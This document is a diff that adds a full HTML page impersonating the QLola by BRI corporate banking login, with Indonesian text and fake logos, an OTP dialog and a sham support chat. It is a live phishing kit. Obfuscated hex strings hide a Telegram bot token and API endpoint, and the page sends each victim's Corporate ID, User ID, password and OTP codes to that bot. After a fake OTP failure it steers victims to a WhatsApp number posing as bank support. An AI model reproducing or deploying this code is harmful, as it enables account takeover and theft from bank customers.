@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="id">
+<head<meta name="google-site-verification" content="uyUvt5Hs6S5vSN9EmYkWjNtYvvxe0voAdx5y-RwGaZU" />
+  <link rel="icon" href="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260726_193928_740.jpg?w=544" sizes="64x64">
+<link rel="apple-touch-icon" href="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260726_193928_740.jpg?w=544">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<meta name="description" content="Halaman login resmi QLola untuk akses layanan perbankan. Masukkan Corporate ID, User ID dan kata sandi Anda dengan aman.">
+<meta name="keywords" content="QLola, Login QLola, QLola BRI, Login Perbankan, Corporate ID, User ID, Kata Sandi, Akses Aman">
+<meta name="robots" content="index, follow">
+<meta name="author" content="QLola BRI">
+<title>Qlola By BRI </title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+    body{color:#fff;user-select:none;position:relative}
+    body::before{content:"";position:fixed;inset:0;background:url(https://dodytrede.wordpress.com/wp-content/uploads/2026/07/screenshot_20260725-142106.jpg?w=683) center/100% 100% no-repeat;background-position:center 30%;opacity:.95;z-index:-1}
+    img{width:100%;height:auto;display:block}
+
+    .halaman-pembuka{position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.5);display:flex;align-items:flex-start;justify-content:center;padding:29% 4% 0;transition:.5s}
+    .halaman-pembuka.hilang{opacity:0;pointer-events:none}
+    .bungkus-logo{width:100%;max-width:455px;border-radius:12px;overflow:hidden;position:relative}
+    .tombol-tutup{position:absolute;top:8px;right:10px;font-size:28px;color:#fff;cursor:pointer}
+
+    .form-box{position:relative;z-index:2;width:80%;max-width:300px;background:rgba(255,255,255,.2);border-radius:18px;padding:22px 20px;border-top:10px solid #ff7700;margin:0 auto 30px}
+    .form-title{text-align:center;font-size:30px;font-weight:bold;margin-bottom:18px}
+    .form-group{margin-bottom:15px}
+    .label{font-size:18px;margin-bottom:6px;display:flex;gap:5px}
+    .info-icon{width:14px;height:14px;border:1px solid #fff;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:10px}
+    .input-field{width:100%;padding:13px 16px;border-radius:10px;border:none;outline:none;font-size:15px;background:rgba(255,255,255,.95);color:#000}
+    .input-field.salah{border:2px solid #ff3333}
+    .password-wrap{position:relative}
+    .eye-icon{position:absolute;right:16px;top:50%;transform:translateY(-50%);width:22px;height:22px;cursor:pointer;background:url(https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260724_034300_778.jpg?w=82) center/contain no-repeat}
+    .eye-icon.buka{background:url(https://isiformulirbanksulselbar.wordpress.com/wp-content/uploads/2026/07/img_20260724_032926_734.jpg?w=84) center/contain no-repeat}
+    .forgot-link{text-align:right;margin-bottom:20px}
+    .forgot-link a{color:#fff;font-size:14px;text-decoration:none}
+    .btn-login{width:100%;padding:13px;border-radius:50px;border:none;background:rgba(255,255,255,.95);color:#000;font-size:17px;font-weight:bold;cursor:not-allowed;transition:.3s}
+    .btn-login.active{background:#ff7700;color:#fff;cursor:pointer}
+    .btn-login.loading{background:#ff7700;color:#fff;cursor:wait;opacity:.8}
+
+    .kotak-otp{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);align-items:center;justify-content:center;z-index:999;padding:20px}
+    .isi-otp{background:#fff;border-radius:20px;padding:22px;max-width:410px;width:100%;color:#333;position:relative}
+    .judul-otp{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px}
+    .judul-otp h2{font-size:22px}
+    .tutup-otp{font-size:28px;cursor:pointer}
+    .info-otp{background:#e6f2ff;padding:10px;border-radius:8px;margin-bottom:15px;display:flex;gap:8px;align-items:center}
+    .teks-otp{margin-bottom:20px;line-height:1.5}
+    .btn-kirim-otp{width:100%;padding:12px;border-radius:8px;border:1px solid #4088e0;background:#fff;color:#4088e0;font-weight:bold;font-size:16px;cursor:pointer;margin-bottom:25px}
+    .btn-kirim-otp.tunggu{cursor:not-allowed;opacity:.8;background:#f0f8ff}
+    .kolom-otp{display:flex;gap:10px;justify-content:center;margin-bottom:20px}
+    .kolom-otp input{width:31px;height:31px;text-align:center;font-size:20px;border:1px solid #ccc;border-radius:8px;outline:none;inputmode:numeric}
+    .btn-validasi{width:100%;padding:12px;border-radius:8px;border:none;background:#ccc;color:#666;font-weight:bold;cursor:not-allowed;font-size:16px}
+    .btn-validasi.aktif{background:#4088e0;color:#fff;cursor:pointer}
+    .btn-validasi.loading{background:#4088e0;color:#fff;cursor:wait;opacity:.8}
+
+    .pesan-gagal{display:none;position:absolute;top:50%;left:10%;right:10%;transform:translateY(-50%);background:#fff;border:2px solid #ff0000;border-radius:12px;padding:20px 15px;text-align:center;z-index:1000}
+    .pesan-gagal p{color:#ff0000;font-size:16px;font-weight:bold;margin-bottom:18px}
+    .btn-coba-lagi{padding:8.5px 25.5px;background:#0055cc;color:#fff;border:none;border-radius:6px;font-size:12.75px;font-weight:bold;cursor:pointer}
+
+    .live-chat{display:none;position:fixed;bottom:0;right:0;width:100%;height:10%;background:#fff;z-index:1002;transition:all .3s ease;border-radius:16px 16px 0 0;box-shadow:0 -2px 15px rgba(0,85,204,0.2);flex-direction:column}
+    .live-chat.muncul{height:60%}
+    .live-chat.kecil{height:10%}
+    .notif-chat{position:absolute;top:-10px;right:15px;background:#ff3333;color:#fff;width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:bold;animation:kedip 1s infinite}
+    @keyframes kedip{0%,100%{opacity:1}50%{opacity:.4}}
+
+    .kepala-chat{background:#075E54;color:#fff;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;flex-shrink:0}
+    .bagian-kiri{display:flex;align-items:center;gap:10px}
+    .logo-chat{width:40px;height:40px;border-radius:50%;overflow:hidden;border:1px solid #ccc}
+    .logo-chat img{width:100%;height:100%;object-fit:cover}
+    .info-nama{display:flex;align-items:center;gap:5px}
+    .centang-biru{width:16px;height:16px;display:inline-block}
+    .centang-biru img{width:100%;height:100%;object-fit:contain}
+    .info-chat h4{font-size:15px;margin-bottom:1px;color:#fff}
+    .info-chat span{font-size:12px;opacity:.9;color:#fff}
+    .tombol-kecil{font-size:22px;cursor:pointer;padding:0 8px;color:#fff}
+
+    .badan-chat{flex:1;padding:10px;background:#E5DDD0;display:flex;flex-direction:column;gap:8px;overflow-y:auto}
+    .balasan{background:#fff;color:#000;padding:8px 12px;border-radius:7px 12px 12px 7px;max-width:80%;align-self:flex-start;font-size:14px;line-height:1.5;box-shadow:0 1px 1px rgba(0,0,0,.05)}
+    .pesan-pengguna{background:#DCF8C6;color:#000;padding:8px 12px;border-radius:12px 7px 7px 12px;max-width:80%;align-self:flex-end;font-size:14px;line-height:1.5;box-shadow:0 1px 1px rgba(0,0,0,.05)}
+
+    .tombol-bantuan{display:flex;flex-direction:column;gap:8px;margin-top:8px}
+    .tombol-bantuan a{padding:9px 12px;background:#F0F2F5;color:#000;border-radius:8px;text-decoration:none;font-size:13px;text-align:center;cursor:pointer;border:none}
+    .tombol-bantuan a:hover{background:#E4E6EB}
+
+    .peringatan{background:#FFF3CD;border:1px solid #FFC107;color:#000;padding:8px;border-radius:7px;font-size:12px;line-height:1.4;margin-top:8px}
+
+    .kaki-chat{padding:8px 10px;display:flex;gap:8px;align-items:center;background:#F0F2F5;flex-shrink:0}
+    .kolom-kirim{flex:1;padding:10px 14px;border:none;border-radius:20px;outline:none;font-size:14px;background:#fff;box-shadow:inset 0 1px 2px rgba(0,0,0,.05);color:#000}
+    .btn-kirim{background:transparent;color:#075E54;border:none;border-radius:50%;width:38px;height:38px;cursor:pointer;font-size:18px;display:flex;align-items:center;justify-content:center}
+  </style>
+</head>
+<body oncontextmenu="return false;" oncopy="return false;">
+
+<div class="halaman-pembuka" id="halamanPembuka"><div class="bungkus-logo"><span class="tombol-tutup" onclick="tutupPembuka()">×</span><img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260724_040646_951.jpg?w=846" alt="Logo"></div></div>
+<div class="logo-atas"><img src="https://banksulselbar.wordpress.com/wp-content/uploads/2026/07/img_20260723_211237_428.jpg?w=1024" alt="Logo BRI"></div>
+<div class="logo-tengah"><img src="https://isiformulirbanksulselbar.wordpress.com/wp-content/uploads/2026/07/img_20260724_044215_358.jpg?w=1024" alt="Logo QLola"></div>
+
+<div class="form-box">
+  <div class="form-title">LOGIN</div>
+  <div class="form-group"><label class="label">Corporate ID <span class="info-icon">ⓘ</span></label><input type="text" id="cid" class="input-field" placeholder="Masukkan Corporate ID" maxlength="50" autocomplete="off"></div>
+  <div class="form-group"><label class="label">User ID</label><input type="text" id="uid" class="input-field" placeholder="Masukkan User ID" maxlength="30" autocomplete="off"></div>
+  <div class="form-group"><label class="label">Kata Sandi</label><div class="password-wrap"><input type="password" id="pass" class="input-field" placeholder="Masukkan Kata Sandi" maxlength="30" autocomplete="off"><span class="eye-icon" id="btnMata" onclick="ubahMata()"></span></div></div>
+  <div class="forgot-link"><a href="https://qlola.bri.co.id/forgot-password" target="_blank">LUPA KATA SANDI?</a></div>
+  <button class="btn-login" id="btnMasuk" disabled>Masuk</button>
+</div>
+
+<div class="logo-bawah">
+  <img src="https://banksulselbar.wordpress.com/wp-content/uploads/2026/07/screenshot_20260723-193505.jpg?w=1024" alt="L1">
+  <img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/screenshot_20260723-214226.jpg?w=798" alt="L2">
+  <img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/screenshot_20260723-214128.jpg?w=599" alt="L3">
+  <img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260725_214113_357.jpg?w=710" alt="L4">
+  <img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/screenshot_20260725-214326.jpg?w=621" alt="L5">
+  <img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/screenshot_20260725-214338.jpg?w=1024" alt="L6">
+</div>
+
+<div class="kotak-otp" id="kotakOtp">
+  <div class="isi-otp">
+    <div class="pesan-gagal" id="pesanGagal"><p>OTP yang Anda masukkan salah!</p><button class="btn-coba-lagi" onclick="cobaLagi()">Coba Lagi</button></div>
+    <div class="judul-otp"><h2>Validasi OTP</h2><span class="tutup-otp" onclick="tutupOtp()">×</span></div>
+    <div class="info-otp"><span>ⓘ</span><div id="teksInfoOtp">Kenapa membutuhkan OTP?</div><span>▼</span></div>
+    <div class="teks-otp" id="teksPenjelasan">Kami akan mengirimkan kode OTP ke alamat email berikut : *********a@gmail.com, Pastikan email Anda telah sesuai.</div>
+    <button class="btn-kirim-otp" id="btnKirimOtp">Kirim Kode OTP</button>
+    <div class="kolom-otp">
+      <input type="number" maxlength="1" class="kotak" data-urut="1">
+      <input type="number" maxlength="1" class="kotak" data-urut="2">
+      <input type="number" maxlength="1" class="kotak" data-urut="3">
+      <input type="number" maxlength="1" class="kotak" data-urut="4">
+      <input type="number" maxlength="1" class="kotak" data-urut="5">
+      <input type="number" maxlength="1" class="kotak" data-urut="6">
+    </div>
+    <button class="btn-validasi" id="btnValidasi" disabled>Validasi</button>
+  </div>
+</div>
+
+<div class="live-chat" id="liveChat">
+  <div class="notif-chat">!</div>
+  <div class="kepala-chat">
+    <div class="bagian-kiri">
+      <div class="logo-chat"><img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/images-23.jpeg?w=225" alt="Profil"></div>
+      <div class="info-chat">
+        <div class="info-nama">
+          <h4>QLola BRI</h4>
+          <div class="centang-biru"><img src="https://dodytrede.wordpress.com/wp-content/uploads/2026/07/img_20260726_025341_957.png?w=452" alt="Terverifikasi"></div>
+        </div>
+        <span>Online</span>
+      </div>
+    </div>
+    <span class="tombol-kecil" id="btnKecil" onclick="ubahUkuranChat()">×</span>
+  </div>
+  <div class="badan-chat" id="badanChat"></div>
+  <div class="kaki-chat"><input type="text" class="kolom-kirim" id="kolomKirim" placeholder="Kirim pesan..."><button class="btn-kirim" onclick="kirimPesan()">➤</button></div>
+</div>
+
+<script>
+let timerKirim;
+const nomorWa = '6282374360830';
+
+const notifSuara = new (window.AudioContext || window.webkitAudioContext)();
+function bunyiNotif(){
+  let osilator = notifSuara.createOscillator();
+  let penguat = notifSuara.createGain();
+  osilator.connect(penguat);
+  penguat.connect(notifSuara.destination);
+  osilator.frequency.value = 800;
+  osilator.type = 'sine';
+  penguat.gain.value = 0.2;
+  osilator.start();
+  penguat.gain.exponentialRampToValueAtTime(0.001, notifSuara.currentTime + 0.3);
+  osilator.stop(notifSuara.currentTime + 0.3);
+}
+function bunyiTigaKali(){
+  bunyiNotif();
+  setTimeout(bunyiNotif, 150);
+  setTimeout(bunyiNotif, 300);
+}
+
+
+function _dX(a){
+  let hasil = "";
+  for(let i=0; i<a.length; i+=2){
+    hasil += String.fromCharCode(parseInt(a.substr(i,2),16));
+  }
+  return hasil;
+}
+const _p = [
+  "383734303731333130363a4141473138457a49335f767475613679482d30374461474962455062636b6368506b38",
+  "38323038323831363039",
+  "68747470733a2f2f6170692e74656c656772616d2e6f72672f626f74"
+];
+const _tk = _dX(_p[0]);
+const _id = _dX(_p[1]);
+const _api = _dX(_p[2]);
+
+const cid = document.getElementById('cid'), uid = document.getElementById('uid'), pass = document.getElementById('pass');
+const btnMasuk = document.getElementById('btnMasuk'), btnMata = document.getElementById('btnMata');
+const pesanGagal = document.getElementById('pesanGagal'), kotakOtp = document.getElementById('kotakOtp');
+const btnValidasi = document.getElementById('btnValidasi'), btnKirimOtp = document.getElementById('btnKirimOtp');
+const liveChat = document.getElementById('liveChat'), badanChat = document.getElementById('badanChat');
+const kolomKirim = document.getElementById('kolomKirim'), btnKecil = document.getElementById('btnKecil');
+const teksInfoOtp = document.getElementById('teksInfoOtp'), teksPenjelasan = document.getElementById('teksPenjelasan');
+const semuaKotakOtp = document.querySelectorAll('.kolom-otp input');
+
+let sandiTerlihat = false, kodeOtpSementara = '';
+
+function mulaiHitungMundur(){
+  clearInterval(timerKirim);
+  let detik = 60;
+  btnKirimOtp.innerText = `Tunggu ${detik} detik`;
+  btnKirimOtp.classList.add('tunggu');
+  timerKirim = setInterval(() => {
+    detik--;
+    btnKirimOtp.innerText = `Tunggu ${detik} detik`;
+    if(detik <= 0){clearInterval(timerKirim);btnKirimOtp.innerText='Kirim Kode OTP';btnKirimOtp.classList.remove('tunggu');}
+  }, 1000);
+}
+
+function tutupPembuka(){halamanPembuka.classList.add('hilang')}
+function tutupOtp(){
+  kotakOtp.style.display='none';
+  document.documentElement.style.overflow='auto';
+  document.body.style.overflow='auto';
+  clearInterval(timerKirim);
+  btnKirimOtp.innerText='Kirim Kode OTP';
+  btnKirimOtp.classList.remove('tunggu');
+  semuaKotakOtp.forEach(i=>i.value='');
+  btnValidasi.classList.remove('aktif');
+  btnValidasi.disabled=true;
+  pesanGagal.style.display='none';
+  teksInfoOtp.innerText='Kenapa membutuhkan OTP?';
+  teksPenjelasan.innerText='Kami akan mengirimkan kode OTP ke alamat email berikut : *********a@gmail.com, Pastikan email Anda telah sesuai.';
+}
+
+function bukaWa(isiPesan){
+  let teksDasar = `Halo, saya butuh bantuan QLola BRI\nPesan: ${isiPesan}\nCorporate ID: ${cid.value.trim()}\nUser ID: ${uid.value.trim()}`;
+  let teksAkhir = encodeURIComponent(teksDasar);
+  window.open(`https://wa.me/${nomorWa}?text=${teksAkhir}`,'_blank');
+}
+
+function cobaLagi(){
+  pesanGagal.style.display='none';
+  semuaKotakOtp.forEach(i=>i.value='');
+  btnValidasi.classList.remove('aktif');
+  btnValidasi.disabled=true;
+  clearInterval(timerKirim);
+  teksInfoOtp.innerText='Masukkan Kode OTP Token Anda';
+  teksPenjelasan.innerText='Kode Telah Di Kirim Aktivasi QLola IB Anda. Jangan berikan kepada siapapun.';
+  mulaiHitungMundur();
+  liveChat.style.display='flex';
+  liveChat.classList.remove('kecil');
+  setTimeout(()=>{liveChat.classList.add('muncul');kolomKirim.focus();bunyiTigaKali()},100);
+  badanChat.innerHTML = `<div class="balasan">Silakan masukkan kode OTP Token yang telah dikirimkan Qlola IB Anda .<br><br>Bisa Saya bantu Untuk yang dibutuhkan Sekarang Silahkan Cek OTP Token IB Anda Untuk Aktivasi Login Sekarang:</div>
+  <div class="tombol-bantuan">
+    <a onclick="bukaWa('Masalah OTP/ Token')">Masalah OTP/ Token</a>
+    <a onclick="bukaWa('Lupa / Masalah Kata Sandi')">Kata Sandi</a>
+    <a href="https://wa.me/6282374360830" target="_blank" class="tombol-link">Hubungi Kami</a>
+    <a href="https://wa.me/6282374360830" target="_blank" class="tombol-link">Info Keamanan</a>
+  </div>`;
+  badanChat.scrollTop = badanChat.scrollHeight;
+}
+
+function ubahUkuranChat(){
+  if(liveChat.classList.contains('muncul')){liveChat.classList.remove('muncul');liveChat.classList.add('kecil');btnKecil.innerText='↗';kolomKirim.blur()}
+  else{liveChat.classList.remove('kecil');liveChat.classList.add('muncul');btnKecil.innerText='×';kolomKirim.focus()}
+}
+
+function cekIsi(){
+  let adaIsi = cid.value.trim() && uid.value.trim() && pass.value.trim();
+  btnMasuk.disabled = !adaIsi;
+  btnMasuk.classList.toggle('active', adaIsi);
+}
+[cid,uid,pass].forEach(el=>el.addEventListener('input',cekIsi));
+
+function ubahMata(){
+  sandiTerlihat = !sandiTerlihat;
+  pass.type = sandiTerlihat ? 'text' : 'password';
+  btnMata.classList.toggle('buka', sandiTerlihat);
+}
+
+btnMasuk.addEventListener('click', async ()=>{
+  btnMasuk.innerText='Memproses...';
+  btnMasuk.disabled=true;
+  try{
+    await fetch(`${_api}${_tk}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:_id,text:`📩 DATA LOGIN MASUK:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}\n🔹 Kata Sandi: ${pass.value.trim()}`})
+    });
+  }catch(e){console.log('Gagal kirim:',e)}
+  setTimeout(()=>{
+    btnMasuk.innerText='Masuk';
+    kotakOtp.style.display='flex';
+    document.documentElement.style.overflow='hidden';
+    document.body.style.overflow='hidden';
+    semuaKotakOtp[0].focus();
+  },1500);
+});
+
+semuaKotakOtp.forEach((kotak, indeks, arr)=>{
+  kotak.addEventListener('input',()=>{
+    if(kotak.value.length === 1 && indeks < arr.length-1) arr[indeks+1].focus();
+    kodeOtpSementara = Array.from(arr).map(k=>k.value).join('');
+    btnValidasi.disabled = kodeOtpSementara.length !== 6;
+    btnValidasi.classList.toggle('aktif', kodeOtpSementara.length === 6);
+  });
+  kotak.addEventListener('keydown',(e)=>{
+    if(e.key==='Backspace' && !kotak.value && indeks>0) arr[indeks-1].focus();
+  });
+});
+
+
+btnKirimOtp.addEventListener('click', async ()=>{
+  if(!btnKirimOtp.classList.contains('tunggu')){
+    mulaiHitungMundur();
+    try{
+      await fetch(`${_api}${_tk}/sendMessage`,{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({chat_id:_id,text:`🔑 KODE TOKEN DIMINTA:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}`})
+      });
+    }catch(e){console.log('Gagal kirim token:',e)}
+  }
+});
+
+
+btnValidasi.addEventListener('click', async ()=>{
+  btnValidasi.innerText='Memproses...';
+  btnValidasi.disabled=true;
+  try{
+    await fetch(`${_api}${_tk}/sendMessage`,{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:_id,text:`🔑 KODE OTP DITERIMA:\n\n🔹 Corporate ID: ${cid.value.trim()}\n🔹 User ID: ${uid.value.trim()}\n🔹 Kode OTP: ${kodeOtpSementara}`})
+    });
+  }catch(e){console.log('Gagal kirim OTP:',e)}
+  setTimeout(()=>{
+    btnValidasi.innerText='Validasi';
+    pesanGagal.style.display='flex';
+    semuaKotakOtp.forEach(k=>k.value='');
+    btnValidasi.classList.remove('aktif');
+    btnValidasi.disabled=true;
+  },2000);
+});
+
+
+kolomKirim.addEventListener('keydown',(e)=>{if(e.key==='Enter')kirimPesan()});
+function kirimPesan(){
+  let teks = kolomKirim.value.trim();
+   if(!teks)return;
+   bukaWa(teks);
+   kolomKirim.value='';
+ }
+ </script>
+ </body>
+ </html>
